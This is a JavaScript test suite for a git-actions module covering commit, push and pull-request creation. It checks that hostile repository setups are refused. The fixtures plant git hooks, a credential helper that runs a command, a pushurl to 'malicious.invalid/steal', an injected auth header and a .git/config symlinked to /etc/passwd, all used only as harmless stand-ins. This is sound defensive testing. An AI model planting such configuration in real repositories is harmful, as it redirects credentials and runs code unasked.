import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, readFile, writeFile, rm, symlink } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { workspaceGitAction } from '../git-actions.mjs';
import { runCommand } from '../workspace-files.mjs';

const gitEnv = { PATH: '/usr/local/bin:/usr/bin:/bin', LANG: 'C.UTF-8', HOME: '/nonexistent', GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null', GIT_AUTHOR_NAME: 'Fixture', GIT_AUTHOR_EMAIL: 'fixture@example.invalid', GIT_COMMITTER_NAME: 'Fixture', GIT_COMMITTER_EMAIL: 'fixture@example.invalid' };

async function fixture(t, initialized = true) {
  const directory = await mkdtemp(join(tmpdir(), 'codex-git-actions-'));
  const cwd = join(directory, 'project');
  await mkdir(cwd);
  t.after(() => rm(directory, { recursive: true, force: true }));
  const git = async (...args) => {
    const result = await runCommand('git', args, { cwd, env: gitEnv });
    assert.equal(result.code, 0, result.stderr);
    return result.stdout.trim();
  };
  if (initialized) {
    await git('init', '--initial-branch=feature/team/task');
    await writeFile(join(cwd, 'a.txt'), 'initial a\n');
    await writeFile(join(cwd, 'b.txt'), 'initial b\n');
    await git('add', '.');
    await git('commit', '-m', 'Initial');
    await git('remote', 'add', 'origin', 'https://github.com/example/project.git');
    await git('config', 'user.name', 'Project Author');
    await git('config', 'user.email', 'project@example.invalid');
  }
  const calls = [];
  const runtime = {
    cwd: () => cwd,
    exec: async (id, argv, options) => {
      calls.push({ id, argv, options });
      return runCommand(argv[0], argv.slice(1), { ...options, cwd, env: { ...gitEnv, ...options.env } });
    },
  };
  return { directory, cwd, git, runtime, calls };
}

test('status reports true HEAD changes including untracked files without disturbing staging', async (t) => {
  const f = await fixture(t);
  await writeFile(join(f.cwd, 'a.txt'), 'staged a\n');
  await f.git('add', 'a.txt');
  await writeFile(join(f.cwd, 'a.txt'), 'current a\n');
  await writeFile(join(f.cwd, 'new.txt'), 'new file\n');
  const index = await f.git('show', ':a.txt');
  const status = await workspaceGitAction(f.runtime, 'id');
  assert.equal(status.branch, 'feature/team/task');
  assert.equal(status.head, await f.git('rev-parse', 'HEAD'));
  assert.equal(status.commitSupported, true);
  assert.equal(status.pushReason, 'github_auth_required');
  assert.equal(status.githubAuthenticated, false);
  assert.match(status.diff, /\+current a/);
  assert.match(status.diff, /\+new file/);
  assert.deepEqual(status.files.map(({ path, indexStatus, worktreeStatus }) => ({ path, indexStatus, worktreeStatus })), [
    { path: 'a.txt', indexStatus: 'M', worktreeStatus: 'M' },
    { path: 'new.txt', indexStatus: '?', worktreeStatus: '?' },
  ]);
  assert.equal(await f.git('show', ':a.txt'), index);
  assert.equal(status.publishRemotes[0].repository, 'example/project');
});

test('selected commit includes current contents and preserves every unselected staged and working change', async (t) => {
  const f = await fixture(t);
  await writeFile(join(f.cwd, 'a.txt'), 'staged a\n');
  await writeFile(join(f.cwd, 'b.txt'), 'staged b\n');
  await f.git('add', '.');
  await writeFile(join(f.cwd, 'a.txt'), 'current a\n');
  await writeFile(join(f.cwd, 'b.txt'), 'current b\n');
  const before = await workspaceGitAction(f.runtime, 'id');
  const result = await workspaceGitAction(f.runtime, 'id', 'commit', { message: 'Selected changes', paths: ['a.txt'], expectedHead: before.head, expectedStatusVersion: before.statusVersion });
  assert.equal(result.commit.sha, await f.git('rev-parse', 'HEAD'));
  assert.equal(await f.git('show', 'HEAD:a.txt'), 'current a');
  assert.equal(await f.git('show', 'HEAD:b.txt'), 'initial b');
  assert.equal(await f.git('show', ':b.txt'), 'staged b');
  assert.equal(await readFile(join(f.cwd, 'b.txt'), 'utf8'), 'current b\n');
  assert.equal(await f.git('show', '-s', '--format=%an <%ae>'), 'Project Author <project@example.invalid>');
  assert.deepEqual(result.status.files.map((file) => file.path), ['b.txt']);
  assert.equal(result.status.commitReason, null);
});

test('commit supports rename, deletion, literal filenames and an unborn initial commit', async (t) => {
  const f = await fixture(t);
  await f.git('mv', 'a.txt', 'renamed.txt');
  await rm(join(f.cwd, 'b.txt'));
  await writeFile(join(f.cwd, ':literal[1].txt'), 'literal\n');
  const status = await workspaceGitAction(f.runtime, 'id');
  assert.equal(status.files.find((file) => file.path === 'renamed.txt').originalPath, 'a.txt');
  const result = await workspaceGitAction(f.runtime, 'id', 'commit', { message: 'Rename and remove', all: true, expectedHead: status.head });
  assert.equal(result.status.dirty, false);
  assert.equal(await f.git('show', 'HEAD:renamed.txt'), 'initial a');
  assert.equal(await f.git('show', 'HEAD::literal[1].txt'), 'literal');
  const empty = await fixture(t, false);
  assert.equal((await workspaceGitAction(empty.runtime, 'id')).available, false);
  await empty.git('init', '--initial-branch=main');
  await writeFile(join(empty.cwd, 'first.txt'), 'first\n');
  const initial = await workspaceGitAction(empty.runtime, 'id', 'commit', { message: 'First', all: true, expectedHead: null });
  assert.equal(initial.status.dirty, false);
  assert.equal(await empty.git('show', 'HEAD:first.txt'), 'first');
});

test('stale HEAD or reviewed file bytes are rejected before staging', async (t) => {
  const f = await fixture(t);
  await writeFile(join(f.cwd, 'a.txt'), 'reviewed\n');
  const status = await workspaceGitAction(f.runtime, 'id');
  await writeFile(join(f.cwd, 'a.txt'), 'changed after review\n');
  await assert.rejects(workspaceGitAction(f.runtime, 'id', 'commit', { message: 'Stale', all: true, expectedHead: status.head, expectedStatusVersion: status.statusVersion }), { code: 'repository_changed' });
  await assert.rejects(workspaceGitAction(f.runtime, 'id', 'commit', { message: 'Stale HEAD', all: true, expectedHead: '0'.repeat(40) }), { code: 'repository_changed' });
  assert.equal(await f.git('rev-parse', 'HEAD'), status.head);
  assert.equal(await f.git('diff', '--cached'), '');
});

test('invalid selections and external configuration cannot cause a commit or execute repository hooks', async (t) => {
  const f = await fixture(t);
  await writeFile(join(f.cwd, 'a.txt'), 'updated\n');
  const head = await f.git('rev-parse', 'HEAD');
  for (const input of [{ paths: ['../outside'] }, { paths: ['.git/config'] }, { paths: ['missing'] }, { paths: ['a.txt'], all: true }, {}]) {
    await assert.rejects(workspaceGitAction(f.runtime, 'id', 'commit', { message: 'Invalid', ...input }), { code: 'invalid_paths' });
  }
  await assert.rejects(workspaceGitAction(f.runtime, 'id', 'commit', { message: 'Invalid', all: true, env: { GH_TOKEN: 'client-token' } }), { code: 'invalid_git_request' });
  const marker = join(f.directory, 'executed');
  for (const hook of ['pre-commit', 'post-commit', 'fsmonitor']) await writeFile(join(f.cwd, '.git/hooks', hook), `#!/bin/sh\nprintf executed > '${marker}'\n`, { mode: 0o755 });
  await f.git('config', 'core.fsmonitor', join(f.cwd, '.git/hooks/fsmonitor'));
  assert.equal(await f.git('rev-parse', 'HEAD'), head);
  await workspaceGitAction(f.runtime, 'id', 'commit', { message: 'Safe commit', all: true });
  await assert.rejects(readFile(marker), { code: 'ENOENT' });
  await f.git('config', 'filter.external.clean', 'touch ' + marker);
  await assert.rejects(workspaceGitAction(f.runtime, 'id'), { code: 'unsupported_repository' });
});

test('Git operation locks, conflicts and escaped metadata disable actions without modifying files', async (t) => {
  for (const lock of ['MERGE_HEAD', 'index.lock', 'codex-actions.lock']) await t.test(lock, async (t) => {
    const f = await fixture(t);
    await writeFile(join(f.cwd, 'a.txt'), 'preserved\n');
    await writeFile(join(f.cwd, '.git', lock), lock === 'MERGE_HEAD' ? await f.git('rev-parse', 'HEAD') : '');
    const status = await workspaceGitAction(f.runtime, 'id');
    assert.equal(status.commitSupported, false);
    assert.equal(status.commitReason, 'repository_busy');
    await assert.rejects(workspaceGitAction(f.runtime, 'id', 'commit', { message: 'No', all: true }), { code: 'repository_busy' });
    assert.equal(await readFile(join(f.cwd, 'a.txt'), 'utf8'), 'preserved\n');
  });
  const f = await fixture(t);
  await f.git('switch', '-c', 'other');
  await writeFile(join(f.cwd, 'a.txt'), 'other\n');
  await f.git('commit', '-am', 'Other');
  await f.git('switch', 'feature/team/task');
  await writeFile(join(f.cwd, 'a.txt'), 'main\n');
  await f.git('commit', '-am', 'Main');
  await runCommand('git', ['merge', 'other'], { cwd: f.cwd, env: gitEnv });
  assert.equal((await workspaceGitAction(f.runtime, 'id')).commitReason, 'repository_conflict');
  await assert.rejects(workspaceGitAction(f.runtime, 'id', 'commit', { message: 'Conflict', all: true }), { code: 'repository_conflict' });
  await rm(join(f.cwd, '.git/config'));
  await symlink('/etc/passwd', join(f.cwd, '.git/config'));
  await assert.rejects(workspaceGitAction(f.runtime, 'id'), { code: 'unsafe_repository' });
});

test('publication requires owner credentials and strict GitHub remotes before any network command', async (t) => {
  const f = await fixture(t);
  await assert.rejects(workspaceGitAction(f.runtime, 'id', 'push'), { code: 'github_auth_required' });
  await assert.rejects(workspaceGitAction(f.runtime, 'id', 'pull-request', { title: 'PR', body: '', base: 'main' }), { code: 'github_auth_required' });
  await f.git('remote', 'set-url', 'origin', 'https://token:secret@github.com/example/project.git');
  const token = 'fixture-owner-token';
  await assert.rejects(workspaceGitAction(f.runtime, 'id', 'push', {}, { env: { GH_TOKEN: token } }), { code: 'remote_unsupported' });
  await f.git('remote', 'set-url', 'origin', 'https://example.invalid/project.git');
  await f.git('remote', 'add', 'upstream', 'git@github.com:example/project.git');
  const status = await workspaceGitAction(f.runtime, 'id', 'status', {}, { env: { GH_TOKEN: token } });
  assert.equal(status.githubAuthenticated, true);
  assert.equal(status.pushSupported, true);
  assert.deepEqual(status.publishRemotes, [{ name: 'upstream', repository: 'example/project', url: 'https://github.com/example/project.git' }]);
  assert.equal(JSON.stringify(status).includes(token), false);
});

test('SSH dispatch preserves owned connection and only accepts credentials from trusted options', async (t) => {
  const f = await fixture(t);
  const calls = [];
  const backend = { entry: () => ({ ownerId: 9, remote: { connectionId: 'owned-ssh' } }), connections: { exec: async (owner, connection, argv, options) => {
    calls.push({ owner, connection, options });
    return runCommand(argv[0], argv.slice(1), { ...options, cwd: f.cwd, env: { ...gitEnv, ...options.env } });
  } } };
  const runtime = { backend: () => backend, cwd: () => f.cwd };
  await workspaceGitAction(runtime, 'id', 'status', {}, { env: { GH_TOKEN: 'owner-token', GIT_DIR: '/outside' } });
  assert.equal(calls[0].owner, 9);
  assert.equal(calls[0].connection, 'owned-ssh');
  assert.deepEqual(calls[0].options.env, { GH_TOKEN: 'owner-token' });
  await assert.rejects(workspaceGitAction(runtime, 'id', 'status', { cwd: '/etc' }), { code: 'invalid_git_request' });
});

async function publicationFixture(t) {
  const f = await fixture(t);
  const remote = join(f.directory, 'remote.git');
  const log = join(f.directory, 'network.jsonl');
  const pulls = join(f.directory, 'pulls.json');
  const init = await runCommand('git', ['init', '--bare', remote], { env: gitEnv });
  assert.equal(init.code, 0, init.stderr);
  await f.git('push', remote, 'HEAD:refs/heads/release');
  await writeFile(pulls, '[]');
  const harness = `
# Fixture transport: every publication GitHub URL is rewritten to a local bare
# repository before starting a subprocess. No test can reach GitHub.
fixture_popen = subprocess.Popen
fixture_which = shutil.which
shutil.which = lambda name, **kwargs: '/fixture/gh' if name == 'gh' else fixture_which(name, **kwargs)
def fixture_process(command, **kwargs):
    if command[0] == 'git' and ('push' in command or 'ls-remote' in command):
        assert str(kwargs['cwd']) != ${JSON.stringify(f.cwd)}
        assert kwargs['env']['HOME'] == '/nonexistent'
        assert kwargs['env']['GIT_CONFIG_GLOBAL'] == '/dev/null'
        git_dir = Path(kwargs['env']['GIT_DIR'])
        config = (git_dir / 'config').read_text()
        assert 'malicious' not in config and 'credential' not in config and 'proxy' not in config
        assert 'https://github.com/example/project.git' in command
        assert '--force' not in command and not any(part.startswith('+') for part in command)
        with open(${JSON.stringify(log)}, 'a') as log:
            log.write(json.dumps({'command': 'push' if 'push' in command else 'ls-remote', 'cwd': str(kwargs['cwd']), 'shallow': (git_dir / 'shallow').exists()}) + '\\n')
        command = [${JSON.stringify(remote)} if arg == 'https://github.com/example/project.git' else arg for arg in command]
        command[1:1] = ['-c', 'protocol.file.allow=always']
        kwargs['env']['GIT_ALLOW_PROTOCOL'] = 'file'
    elif command[0] == 'gh':
        assert str(kwargs['cwd']) != ${JSON.stringify(f.cwd)}
        assert kwargs['env']['GH_HOST'] == 'github.com'
        with open(${JSON.stringify(log)}, 'a') as log:
            log.write(json.dumps({'command': command}) + '\\n')
        current = json.loads(Path(${JSON.stringify(pulls)}).read_text())
        if command[1] == 'api':
            assert 'head=example:feature/team/task' in command
            assert 'base=release' in command
            output = json.dumps(current)
        else:
            assert command[1:3] == ['pr', 'create']
            assert command[command.index('--base') + 1] == 'release'
            assert Path(command[command.index('--body-file') + 1]).read_text() == 'Review this change.'
            output = 'https://github.com/example/project/pull/12'
            current.append({'html_url': output, 'number': 12, 'head': {'repo': {'full_name': 'example/project'}}})
            Path(${JSON.stringify(pulls)}).write_text(json.dumps(current))
        command = ['python3', '-I', '-c', 'print(' + repr(output) + ')']
    return fixture_popen(command, **kwargs)
subprocess.Popen = fixture_process
`;
  f.runtime.exec = async (id, argv, options) => {
    const marker = '\ntry:\n    payload = json.load(sys.stdin)';
    assert(argv[3].includes(marker));
    const script = argv[3].replace(marker, `${harness}${marker}`);
    return runCommand(argv[0], [...argv.slice(1, 3), script], { ...options, cwd: f.cwd, env: { ...gitEnv, ...options.env } });
  };
  return { ...f, remote, log, pulls, credentials: { env: { GH_TOKEN: 'fixture-owner-token' } } };
}

test('explicit push uses isolated config, preserves slash branches, and PR creation is independently repeatable', async (t) => {
  const f = await publicationFixture(t);
  await f.git('config', 'url.https://malicious.invalid/.insteadOf', 'https://github.com/');
  await f.git('config', 'remote.origin.pushurl', 'https://malicious.invalid/steal');
  await f.git('config', 'http.https://github.com/.extraHeader', 'Authorization: malicious');
  await f.git('config', 'credential.https://github.com.helper', '!touch /fixture-malicious');
  await writeFile(join(f.cwd, 'a.txt'), 'published change\n');
  const committed = await workspaceGitAction(f.runtime, 'id', 'commit', { message: 'Publishable change', all: true }, f.credentials);
  const input = { title: 'Publish change', body: 'Review this change.', base: 'release', draft: true, expectedHead: committed.commit.sha };
  await assert.rejects(workspaceGitAction(f.runtime, 'id', 'pull-request', input, f.credentials), { code: 'push_required' });
  const pushed = await workspaceGitAction(f.runtime, 'id', 'push', { expectedHead: committed.commit.sha }, f.credentials);
  assert.equal(pushed.push.branch, 'feature/team/task');
  assert.equal(pushed.status.upstream, 'origin/feature/team/task');
  assert.equal(pushed.status.ahead, 0);
  assert.equal(pushed.status.behind, 0);
  // A same-name PR from somebody else's fork must never be returned as ours.
  await writeFile(f.pulls, JSON.stringify([{ html_url: 'https://github.com/example/project/pull/11', number: 11, head: { repo: { full_name: 'someone/project' } } }]));
  const created = await workspaceGitAction(f.runtime, 'id', 'pull-request', input, f.credentials);
  assert.deepEqual(created.pullRequest, { url: 'https://github.com/example/project/pull/12', number: 12, existing: false });
  const retried = await workspaceGitAction(f.runtime, 'id', 'pull-request', input, f.credentials);
  assert.equal(retried.pullRequest.existing, true);
  const calls = (await readFile(f.log, 'utf8')).trim().split('\n').map(JSON.parse);
  assert.equal(calls.filter((entry) => entry.command === 'push').length, 1);
  assert.equal(calls.filter((entry) => Array.isArray(entry.command) && entry.command[1] === 'pr').length, 1);
  assert.equal(await f.git('rev-parse', 'HEAD'), committed.commit.sha);
});

test('a rejected push preserves the local commit and never force-pushes', async (t) => {
  const f = await publicationFixture(t);
  await workspaceGitAction(f.runtime, 'id', 'push', {}, f.credentials);
  await f.git('switch', '-c', 'competing');
  await writeFile(join(f.cwd, 'a.txt'), 'competing change\n');
  await f.git('commit', '-am', 'Competing');
  await f.git('push', f.remote, 'HEAD:refs/heads/feature/team/task');
  await f.git('switch', 'feature/team/task');
  await writeFile(join(f.cwd, 'a.txt'), 'our change\n');
  const committed = await workspaceGitAction(f.runtime, 'id', 'commit', { message: 'Ours', all: true }, f.credentials);
  await assert.rejects(workspaceGitAction(f.runtime, 'id', 'push', { expectedHead: committed.commit.sha }, f.credentials), { code: 'push_failed' });
  assert.equal(await f.git('rev-parse', 'HEAD'), committed.commit.sha);
  assert.equal(await f.git('show', 'HEAD:a.txt'), 'our change');
  assert.equal(await f.git('status', '--porcelain'), '');
});
